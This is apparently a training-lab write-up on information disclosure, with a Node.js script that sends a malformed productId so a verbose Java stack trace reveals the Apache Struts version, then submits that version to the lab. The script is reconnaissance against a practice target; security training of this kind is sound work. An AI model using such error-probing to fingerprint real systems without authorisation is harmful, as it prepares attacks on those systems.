# 1 - Error Messages

This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.

### Notes

The application queries products via the `productId` query parameter. When a string value is supplied, it responds with a 500 error containing a verbose error message from the framework:

`GET /product?productId=foo HTTP/1.1`

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 1520

Internal Server Error: java.lang.NumberFormatException: For input string: "foo"
at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)

...

Apache Struts 2 2.3.31
```

### Scripted Solution

```javascript
const axios = require('axios').default
require('dotenv').config({ path: './.env' })

/**
 * Run exploit.
 */
async function main() {
  const labUrl = process.env.LAB_URL

  // Trigger error by requesting product id 'foo'
  try {
    await axios.get(`${labUrl}/product?productId=foo`)
  } catch (errorRes) {
    const resBody = errorRes.response.data

    // Parse response body into array by line
    const errorLines = resBody.split(/\r?\n/)

    // 'Apache Struts 2 2.3.31' is the last line of the response
    const framework = errorLines[errorLines.length - 1]
    let frameworkVersion = framework.split(' ')
    frameworkVersion = frameworkVersion[frameworkVersion.length - 1]

    // Submit version number to solve the lab
    await axios.post(`${labUrl}/submitSolution`, `answer=${frameworkVersion}`)
  }
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })

```
